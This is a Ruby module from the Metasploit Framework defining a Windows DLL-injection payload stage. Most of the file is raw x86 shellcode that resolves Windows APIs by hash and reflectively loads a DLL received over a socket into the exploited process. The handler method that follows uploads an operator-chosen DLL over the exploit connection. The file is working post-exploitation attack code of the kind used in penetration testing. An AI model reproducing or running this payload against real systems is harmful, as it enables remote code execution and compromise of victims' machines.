# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/payload/windows'

module Msf

###
#
# DllInject common module stub that is meant to be included in payloads that
# make use of DLL injection.
#
###
module Payload::Windows::DllInject

  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Inject DLL',
      'Description'   => 'Inject a custom DLL into the exploited process',
      'Author'        =>
        [
          'jt <jt@klake.org>',
          'skape',
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' =>
        {
          'Convention' => 'sockedi -http -https'
        },
      'Stage'         =>
        {
          'Offsets' =>
            {
              'EXITFUNC' => [ 193, 'V' ]
            },
          'Payload' =>

"\x55\x8b\xec\x81\xec\xa8\x01\x00\x00\x53\x56\x57\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff" +
"\x5b\x83\xeb\x15\x89\x9d\x60\xff\xff\xff\x89\xbd\x58\xfe\xff\xff\xeb\x70\x56\x33" +
"\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb" +
"\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c" +
"\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b" +
"\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b" +
"\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b" +
"\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61\xc3\xe8\x8b\xff\xff\xff\x8b\xd8\x68\x8e\x4e" +
"\x0e\xec\x53\xe8\xa0\xff\xff\xff\x83\xc4\x08\x89\x45\xb4\x68\xaa\xfc\x0d\x7c\x53" +
"\xe8\x8f\xff\xff\xff\x83\xc4\x08\x89\x45\xb8\x68\x7e\xd8\xe2\x73\x53\xe8\x7e\xff" +
"\xff\xff\x83\xc4\x08\x89\x45\xbc\x68\x54\xca\xaf\x91\x53\xe8\x6d\xff\xff\xff\x83" +
"\xc4\x08\x89\x45\xc0\x68\xac\x33\x06\x03\x53\xe8\x5c\xff\xff\xff\x83\xc4\x08\x89" +
"\x45\xc4\x68\xaa\xc8\xc8\xa3\x53\xe8\x4b\xff\xff\xff\x83\xc4\x08\x89\x45\xc8\x68" +
"\x1b\xc6\x46\x79\x53\xe8\x3a\xff\xff\xff\x83\xc4\x08\x89\x45\xcc\x68\x80\x09\x12" +
"\x53\x53\xe8\x29\xff\xff\xff\x83\xc4\x08\x89\x45\xd0\x68\xa1\x6a\x3d\xd8\x53\xe8" +
"\x18\xff\xff\xff\x83\xc4\x08\x89\x45\xd4\x33\xc0\xb0\x6c\x50\x68\x6e\x74\x64\x6c" +
"\x54\xff\x55\xb4\x8b\xd8\x68\x95\xdd\xb5\x92\x53\xe8\xf7\xfe\xff\xff\x83\xc4\x08" +
"\x89\x45\xa0\x68\x90\x78\x4a\x49\x53\xe8\xe6\xfe\xff\xff\x83\xc4\x08\x89\x45\xa4" +
"\x68\xb8\x74\x29\x85\x53\xe8\xd5\xfe\xff\xff\x83\xc4\x08\x89\x45\xa8\x68\xcb\x9b" +
"\xb2\x5b\x53\xe8\xc4\xfe\xff\xff\x83\xc4\x08\x89\x45\xac\x68\x94\x9b\x15\xd5\x53" +
"\xe8\xb3\xfe\xff\xff\x83\xc4\x08\x89\x45\xb0\xc6\x45\xf4\x77\xc6\x45\xf5\x73\xc6" +
"\x45\xf6\x32\xc6\x45\xf7\x5f\xc6\x45\xf8\x33\xc6\x45\xf9\x32\xc6\x45\xfa\x00\x8d" +
"\x45\xf4\x50\xff\x55\xb4\x8b\xd0\x68\xb6\x19\x18\xe7\x52\xe8\x7d\xfe\xff\xff\x83" +
"\xc4\x08\x89\x45\xec\x8d\x85\x58\xfe\xff\xff\x50\xe8\x7c\x06\x00\x00\x59\x5f\x5e" +
"\x5b\xc9\xc3\xff\xff\xff\xff\x55\x8b\xec\xe8\x00\x00\x00\x00\x59\x83\xe9\x08\xb8" +
"\xe8\x11\x40\x00\x2d\xe4\x11\x40\x00\x2b\xc8\x8b\x01\x5d\xc3\x55\x8b\xec\x51\x51" +
"\x83\x65\xfc\x00\xeb\x07\x8b\x45\xfc\x40\x89\x45\xfc\x8b\x45\x0c\x0f\xb7\x00\x39" +
"\x45\xfc\x7d\x51\x83\x65\xf8\x00\xeb\x07\x8b\x45\xf8\x40\x89\x45\xf8\x8b\x45\x08" +
"\x8b\x4d\xf8\x3b\x88\x04\x01\x00\x00\x7d\x22\x8b\x45\xfc\x03\x45\xf8\x8b\x4d\x0c" +
"\x8b\x49\x04\x0f\xb7\x04\x41\x8b\x4d\x08\x03\x4d\xf8\x0f\xbe\x49\x04\x3b\xc1\x74" +
"\x02\xeb\x02\xeb\xc9\x8b\x45\x08\x8b\x4d\xf8\x3b\x88\x04\x01\x00\x00\x75\x04\x33" +
"\xc0\xeb\x05\xeb\x9d\x33\xc0\x40\xc9\xc3\x55\x8b\xec\x51\xe8\x68\xff\xff\xff\x89" +
"\x45\xfc\x8b\x45\x10\xff\x70\x08\xff\x75\xfc\xe8\x73\xff\xff\xff\x59\x59\x85\xc0" +
"\x75\x12\x8b\x45\x08\x8b\x4d\xfc\x8b\x89\x10\x01\x00\x00\x89\x08\x33\xc0\xeb\x12" +
"\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x80\x01\x00\x00\xc9\xc2" +
"\x0c\x00\x55\x8b\xec\x51\xe8\x20\xff\xff\xff\x89\x45\xfc\x8b\x45\x08\xff\x70\x08" +
"\xff\x75\xfc\xe8\x2b\xff\xff\xff\x59\x59\x85\xc0\x75\x5d\x8b\x45\x0c\xc7\x00\xe0" +
"\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x04\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x08\xe0" +
"\x5c\x27\x8e\x8b\x45\x0c\xc7\x40\x0c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x10\xe0" +
"\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x14\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x18\xe0" +
"\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x1c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x20\x80" +
"\x00\x00\x00\x33\xc0\xeb\x0f\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x84\x01" +
"\x00\x00\xc9\xc2\x08\x00\x55\x8b\xec\x51\xe8\x90\xfe\xff\xff\x89\x45\xfc\x8b\x45" +
"\x10\xff\x70\x08\xff\x75\xfc\xe8\x9b\xfe\xff\xff\x59\x59\x85\xc0\x75\x10\x8b\x45" +
"\x08\x8b\x4d\xfc\x8b\x89\x10\x01\x00\x00\x89\x08\xeb\x1b\xff\x75\x1c\xff\x75\x18" +
"\xff\x75\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x88\x01\x00" +
"\x00\xc9\xc2\x18\x00\x55\x8b\xec\x51\xe8\x41\xfe\xff\xff\x89\x45\xfc\x8b\x45\xfc" +
"\x8b\x4d\x20\x3b\x88\x10\x01\x00\x00\x75\x12\x8b\x45\x08\x8b\x4d\xfc\x8b\x89\x10" +
"\x01\x00\x00\x89\x08\x33\xc0\xeb\x1e\xff\x75\x20\xff\x75\x1c\xff\x75\x18\xff\x75" +
"\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x8c\x01\x00\x00\xc9" +
"\xc2\x1c\x00\x55\x8b\xec\x51\xe8\xf3\xfd\xff\xff\x89\x45\xfc\x8b\x45\xfc\x8b\x4d" +
"\x08\x3b\x88\x10\x01\x00\x00\x75\x15\x8b\x45\x10\x8b\x4d\xfc\x8b\x89\x10\x01\x00" +
"\x00\x89\x08\xb8\x03\x00\x00\x40\xeb\x27\xff\x75\x2c\xff\x75\x28\xff\x75\x24\xff" +
"\x75\x20\xff\x75\x1c\xff\x75\x18\xff\x75\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08" +
"\x8b\x45\xfc\xff\x90\x90\x01\x00\x00\xc9\xc2\x28\x00\x55\x8b\xec\x83\xec\x28\xc7" +
"\x45\xd8\x05\x00\x00\x00\x8d\x45\xdc\x50\xff\x75\xd8\xff\x75\x0c\xff\x75\x10\x6a" +
"\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8b\x45\x10\x03\x45\xd8\xc6\x00\xe9\x8b" +
"\x45\x10\x83\xc0\x05\x8b\x4d\x0c\x2b\xc8\x8b\x45\x10\x03\x45\xd8\x89\x48\x01\x6a" +
"\x1c\x8d\x45\xe4\x50\xff\x75\x0c\x8b\x45\x08\xff\x90\x70\x01\x00\x00\x8d\x45\xf8" +
"\x50\x6a\x40\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8b\x45" +
"\x0c\xc6\x00\xe9\x8b\x45\x0c\x83\xc0\x05\x8b\x4d\x14\x2b\xc8\x8b\x45\x0c\x89\x48" +
"\x01\x8d\x45\xe0\x50\xff\x75\xf8\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74" +
"\x01\x00\x00\xff\x75\xf0\xff\x75\xe4\x6a\xff\x8b\x45\x08\xff\x90\x78\x01\x00\x00" +
"\xc9\xc3\x55\x8b\xec\xb8\xec\x13\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81" +
"\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x3c\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x58" +
"\x01\x00\x00\xff\x75\x08\xe8\x26\xff\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x3c\x01" +
"\x00\x00\x8b\x4d\x08\x89\x81\x90\x01\x00\x00\xb8\xbf\x12\x40\x00\x2d\x00\x10\x40" +
"\x00\x8b\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x1e\x01\x00\x00\x50" +
"\x8b\x45\x08\xff\xb0\x4c\x01\x00\x00\xff\x75\x08\xe8\xe4\xfe\xff\xff\x83\xc4\x10" +
"\x8b\x45\x08\x05\x1e\x01\x00\x00\x8b\x4d\x08\x89\x81\x84\x01\x00\x00\xb8\x4f\x13" +
"\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08" +
"\x05\x28\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x50\x01\x00\x00\xff\x75\x08\xe8\xa2" +
"\xfe\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x28\x01\x00\x00\x8b\x4d\x08\x89\x81\x88" +
"\x01\x00\x00\xb8\x9e\x13\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81\x08\x01" +
"\x00\x00\x50\x8b\x45\x08\x05\x32\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x54\x01\x00" +
"\x00\xff\x75\x08\xe8\x60\xfe\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x32\x01\x00\x00" +
"\x8b\x4d\x08\x89\x81\x8c\x01\x00\x00\xb8\x77\x12\x40\x00\x2d\x00\x10\x40\x00\x8b" +
"\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x14\x01\x00\x00\x50\x8b\x45" +
"\x08\xff\xb0\x48\x01\x00\x00\xff\x75\x08\xe8\x1e\xfe\xff\xff\x83\xc4\x10\x8b\x45" +
"\x08\x05\x14\x01\x00\x00\x8b\x4d\x08\x89\x81\x80\x01\x00\x00\x5d\xc3\x55\x8b\xec" +
"\x83\xec\x28\xc7\x45\xd8\x05\x00\x00\x00\x6a\x1c\x8d\x45\xe4\x50\xff\x75\x0c\x8b" +
"\x45\x08\xff\x90\x70\x01\x00\x00\x8d\x45\xf8\x50\x6a\x40\xff\x75\xf0\xff\x75\xe4" +
"\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8d\x45\xdc\x50\xff\x75\xd8\xff\x75\x10\xff" +
"\x75\x0c\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8d\x45\xe0\x50\xff\x75\xf8" +
"\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74\x01\x00\x00\xff\x75\xf0\xff\x75" +
"\xe4\x6a\xff\x8b\x45\x08\xff\x90\x78\x01\x00\x00\xc9\xc3\x55\x8b\xec\x8b\x45\x08" +
"\x05\x3c\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x58\x01\x00\x00\xff\x75\x08\xe8\x6e" +
"\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x1e\x01\x00\x00\x50\x8b\x45\x08\xff\xb0" +
"\x4c\x01\x00\x00\xff\x75\x08\xe8\x51\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x28" +
"\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x50\x01\x00\x00\xff\x75\x08\xe8\x34\xff\xff" +
"\xff\x83\xc4\x0c\x8b\x45\x08\x05\x32\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x54\x01" +
"\x00\x00\xff\x75\x08\xe8\x17\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x14\x01\x00" +
"\x00\x50\x8b\x45\x08\xff\xb0\x48\x01\x00\x00\xff\x75\x08\xe8\xfa\xfe\xff\xff\x83" +
"\xc4\x0c\x5d\xc3\x55\x8b\xec\x83\xec\x10\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x89" +
"\x45\xf0\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xf0\x03\x41\x3c\x89\x45\xfc" +
"\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xfc\xff\x70\x50\x8b\x45\xfc\xff\x70\x34\x8b" +
"\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01\x00\x00\x8b\x45\x08" +
"\x83\xb8\x10\x01\x00\x00\x00\x75\x21\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xfc\xff" +
"\x70\x50\x6a\x00\x8b\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01" +
"\x00\x00\x6a\x00\x8b\x45\xfc\xff\x70\x54\x8b\x45\x08\xff\xb0\x0c\x01\x00\x00\x8b" +
"\x45\x08\xff\xb0\x10\x01\x00\x00\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8b" +
"\x45\xfc\x0f\xb7\x40\x14\x8b\x4d\xfc\x8d\x44\x01\x18\x89\x45\xf4\x83\x65\xf8\x00" +
"\xeb\x07\x8b\x45\xf8\x40\x89\x45\xf8\x8b\x45\xfc\x0f\xb7\x40\x06\x39\x45\xf8\x7d" +
"\x4a\x6a\x00\x8b\x45\xf8\x6b\xc0\x28\x8b\x4d\xf4\xff\x74\x01\x10\x8b\x45\xf8\x6b" +
"\xc0\x28\x8b\x4d\x08\x8b\x89\x0c\x01\x00\x00\x8b\x55\xf4\x03\x4c\x02\x14\x51\x8b" +
"\x45\xf8\x6b\xc0\x28\x8b\x4d\x08\x8b\x89\x10\x01\x00\x00\x8b\x55\xf4\x03\x4c\x02" +
"\x0c\x51\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\xeb\xa3\xc9\xc3\x55\x8b\xec" +
"\x83\xec\x30\x8d\x45\xfc\x50\x6a\x40\x68\x98\x01\x00\x00\xff\x75\x08\x8b\x45\x08" +
"\xff\x90\x74\x01\x00\x00\xc6\x45\xd4\x49\xc6\x45\xd5\x6e\xc6\x45\xd6\x69\xc6\x45" +
"\xd7\x74\xc6\x45\xd8\x00\x6a\x00\x6a\x04\x8d\x45\xf0\x50\x8b\x45\x08\xff\x30\x8b" +
"\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xd0\x83\x7d\xd0\x00\x7f\x0b\x6a\x01\x8b" +
"\x45\x08\xff\x90\x64\x01\x00\x00\x6a\x04\x68\x00\x10\x00\x00\xff\x75\xf0\x6a\x00" +
"\x8b\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x0c\x01\x00\x00\x8b\x45" +
"\x08\x83\xb8\x0c\x01\x00\x00\x00\x75\x0b\x6a\x01\x8b\x45\x08\xff\x90\x64\x01\x00" +
"\x00\x83\x65\xd0\x00\x83\x65\xf4\x00\x8b\x45\xf0\x89\x45\xe0\xeb\x12\x8b\x45\xe0" +
"\x2b\x45\xd0\x89\x45\xe0\x8b\x45\xf4\x03\x45\xd0\x89\x45\xf4\x83\x7d\xe0\x00\x7e" +
"\x2d\x6a\x00\xff\x75\xe0\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x03\x45\xf4\x50\x8b" +
"\x45\x08\xff\x30\x8b\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xd0\x83\x7d\xd0\x00" +
"\x7d\x02\xeb\x02\xeb\xbb\x83\x65\xec\x00\xeb\x07\x8b\x45\xec\x40\x89\x45\xec\x8b" +
"\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xec\x0f\xbe\x04\x08\x85\xc0\x74\x1a\x8b" +
"\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\x08\x03\x4d\xec\x8b\x55\xec\x8a\x04\x10" +
"\x88\x41\x04\xeb\xcb\x8b\x45\x08\x03\x45\xec\xc6\x40\x04\x00\x8b\x45\x08\x8b\x4d" +
"\xec\x89\x88\x04\x01\x00\x00\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xec\x8d" +
"\x44\x01\x01\x8b\x4d\x08\x89\x81\x0c\x01\x00\x00\xff\x75\x08\xe8\x98\xfd\xff\xff" +
"\x59\xb8\xe4\x11\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x8b\x89\x08\x01\x00\x00" +
"\x8b\x55\x08\x89\x14\x08\xff\x75\x08\xe8\x1c\xfb\xff\xff\x59\x8b\x45\x08\x83\xc0" +
"\x04\x50\x8b\x45\x08\xff\x90\x5c\x01\x00\x00\x89\x45\xe4\x83\x7d\xe4\x00\x75\x0b" +
"\x6a\x01\x8b\x45\x08\xff\x90\x64\x01\x00\x00\xff\x75\x08\xe8\xb3\xfc\xff\xff\x59" +
"\x8d\x45\xd4\x50\xff\x75\xe4\x8b\x45\x08\xff\x90\x60\x01\x00\x00\x89\x45\xf8\x83" +
"\x7d\xf8\x00\x74\x09\x8b\x45\x08\xff\x30\xff\x55\xf8\x59\x68\x00\x80\x00\x00\x6a" +
"\x00\x8b\x45\x08\x8b\x4d\x08\x8b\x80\x0c\x01\x00\x00\x2b\x81\x04\x01\x00\x00\x48" +
"\x50\x8b\x45\x08\xff\x90\x6c\x01\x00\x00\x6a\x00\x8b\x45\x08\xff\x90\x64\x01\x00" +
"\x00\x83\x65\x08\x00\x33\xc0\xc9\xc3"

        }
      ))

    register_options(
      [
        OptPath.new('DLL', [ true, "The local path to the DLL to upload" ]),
      ], DllInject)

    register_advanced_options(
      [
        OptString.new('LibraryName', [ false, "The symbolic name of the library to upload", "msf.dll" ])
      ], DllInject)
  end

  #
  # Returns the library name
  #
  def library_name
    datastore['LibraryName'] || 'msf.dll'
  end

  #
  # Returns the library path
  #
  def library_path
    datastore['DLL']
  end

  #
  # Transmits the DLL injection payload and its associated DLL to the remote
  # computer so that it can be loaded into memory.
  #
  def handle_connection_stage(conn, opts = {})
    data = library_name + "\x00"

    begin
      File.open(library_path, "rb") { |f|
        data += f.read
      }
    rescue
      print_error("Failed to load DLL: #{$!}.")

      # TODO: exception
      conn.close
      return
    end

    print_status("Uploading DLL (#{data.length} bytes)...")

    # Send the size of the thing we're transferring
    conn.put([ data.length ].pack('V'))
    # Send the image name + image
    conn.put(data)

    print_status("Upload completed.")

    # Call the parent so the session gets created.
    super
  end

end

end

